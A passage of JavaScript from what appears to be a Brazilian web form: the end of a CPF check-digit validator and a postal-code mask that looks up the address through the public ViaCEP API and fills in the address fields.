    if (rest != parseInt(cpf.substring(9, 10)) ) return false;
    sum = 0;
    for (let i = 1; i <= 10; i++) sum = sum + parseInt(cpf.substring(i-1, i)) * (12 - i);
    rest = (sum * 10) % 11;
    if ((rest == 10) || (rest == 11))  rest = 0;
    if (rest != parseInt(cpf.substring(10, 11) ) ) return false;
    return true;
}

async function mascaraCepInteligente(input) {
  let v = input.value.replace(/\D/g, '');
  if (v.length > 5) v = v.replace(/^(\d{5})(\d)/, '$1-$2');
  input.value = v;
  
  if (v.length === 9) { // 00000-000
    try {
      const res = await fetch(`https://viacep.com.br/ws/${v.replace('-','')}/json/`);
      const data = await res.json();
      if (!data.erro) {
        document.getElementById('input-rua').value = data.logradouro || '';
        document.getElementById('input-bairro').value = data.bairro || '';
        document.getElementById('input-cidade').value = data.localidade || '';
        document.getElementById('input-estado').value = data.uf || '';
        document.getElementById('input-numero').focus();
      }
    } catch(e) {}
  }
}
